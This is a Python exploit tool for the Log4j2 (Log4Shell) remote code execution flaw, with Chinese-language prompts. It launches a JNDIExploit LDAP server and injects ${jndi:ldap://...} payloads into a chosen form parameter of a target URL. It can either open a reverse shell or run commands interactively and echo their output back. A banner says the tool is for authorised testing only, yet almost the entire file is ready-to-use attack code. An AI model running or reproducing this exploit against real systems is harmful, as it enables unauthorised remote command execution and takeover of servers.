import sys
import re
import requests
import subprocess
import urllib.parse
import threading
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def str_process(str):
    str = base64.b64encode(str.encode())
    str = urllib.parse.quote(str,"utf-8")
    return str

def exec_cmd(url,parameter,cmd,ip_add):
    payload = "${jndi:ldap://%s:1389/TomcatBypass/TomcatEcho}" % ip_add
    cmd = "echo success &&" + cmd
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "cmd":cmd
    }
    data = {
        parameter: payload
    }

    pattern = re.compile(r"success\n(.*?)\nsuccess", re.S)

    try:
        r = requests.post(url,headers=headers,data=data,timeout=30,verify=False)
        if r.status_code == 200:
            resp = re.findall(pattern, r.text)
            print(resp[0])
        else:
            print("[-] 命令执行失败")
    except Exception as e:
        # print("[-] 执行命令报错:%s" % e)
        print("[-] 命令执行出现其他问题")

def exec_shell(url,parameter,cmd,ip_add):
    cmd = str_process(cmd)
    payload = "${jndi:ldap://%s:1389/TomcatBypass/Command/Base64/%s}" % (ip_add,cmd)
    headers = {
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    }
    data = {
        parameter: payload
    }

    try:
        r = requests.post(url,headers=headers,data=data,timeout=30,verify=False)
        if r.status_code == 200:
            print("[+] 请检查所开启的监听端")
            return True
        else:
            print("[-] 反弹shell失败")
            return False
    except Exception as e:
        # print("[-] 反弹shell报错:%s" % e)
        print("[-] 反弹shell出现其他问题")
        return False

def jndi_thread(ip_add):
    cmd = "java -jar JNDIExploit-1.3-SNAPSHOT.jar -i %s" % ip_add
    Jndi = subprocess.Popen(cmd, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
    for i in iter(Jndi.stdout.readline,b""):
        with open("Jndi_Threadout.txt","a",encoding="utf-8") as f:
            f.write(i.decode().strip())

    for i in iter(Jndi.stderr.readline,b""):
        with open("Jndi_Threaderr.txt","a",encoding="utf-8") as f:
            f.write(i.decode("GBK").strip())

def usage():
    print("")
    print("Log4j2_RCE / Log4j2组件命令执行RCE")
    print("Code By:Jun_sheng @Github:https://github.com/jun-5heng/")
    print("橘子网络安全实验室 @https://0range.team/")
    print("")
    print("*************************警 告*****************************")
    print("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!")
    print("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!")
    print("***********************************************************")
    print("")

def main():
    usage()

    print("[+] 验证系统Java版本")
    ret, val = subprocess.getstatusoutput("java -version")
    val = val.split("\n")
    if "1.8." in val[0]:
        print("[+] 系统Java版本为：%s" % val[0])
    else:
        print("[-] 系统Java版本为: %s 请使用1.8版本Java" % val[0])
        sys.exit(0)

    # 创建JNDI注入线程
    ip_add = input("[+] 请输入启动JDNI服务地址:")
    t = threading.Thread(target=jndi_thread,args=(ip_add,))
    t.setDaemon(True)
    t.start()

    # 反弹shell或直接执行命令
    try:
        url = input("[+] 请输入攻击目标地址:")
        choose = input("[*] 反弹shell or 执行命令?(1 or 2?)")
        if choose == "1":
            # 反弹shell
            parameter = input("[+] 请输入插入参数:")
            cmd = input("[+] 请输入反弹shell命令:")
            while True:
                flag = exec_shell(url, parameter, cmd, ip_add)
                if flag:
                    sys.exit(0)
                else:
                    choose2 = input("[*] 是否重新进行请求?(Y/N)")
                    if choose2 in ('Y','y','yes'):
                        continue
                    elif choose2 in ('N','n','no'):
                        sys.exit(0)
                    else:
                        print("[-] 输入有误")
        elif choose == "2":
            # 执行命令
            parameter = input("[+] 请输入插入参数:")
            while True:
                cmd = input('Jun_sheng:~# ')
                if cmd is not None and cmd not in ("e","exit"):
                    exec_cmd(url,parameter,cmd,ip_add)
                else:
                    sys.exit(0)
    except Exception as e :
        # print("[-] 输入有误:%s" % e)
        print("[-] 输入有误")

main()